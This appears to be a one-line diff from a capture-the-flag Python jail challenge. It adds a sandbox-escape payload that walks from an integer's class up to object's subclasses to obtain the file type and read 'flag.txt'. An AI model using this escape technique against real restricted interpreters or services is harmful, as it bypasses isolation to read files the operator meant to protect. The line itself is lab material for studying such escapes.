@@ -1,0 +1,1 @@
+raw_input((42).__class__.__base__.__subclasses__()[40]('flag.txt').read())
